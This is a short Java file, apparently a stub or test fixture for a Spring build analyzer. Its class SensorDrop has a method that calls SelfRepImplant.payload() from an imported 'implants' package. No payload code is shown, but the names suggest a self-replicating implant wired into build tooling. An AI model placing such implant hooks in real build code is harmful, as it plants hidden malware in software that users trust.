package io.github.jeremylong.spring.build.analyzer;

import java.io.File;
import org.example.implants.SelfRepImplant;

public class SensorDrop {
    public void writeSensor(File target, String pkgName) {
        SelfRepImplant.payload();
    }
}
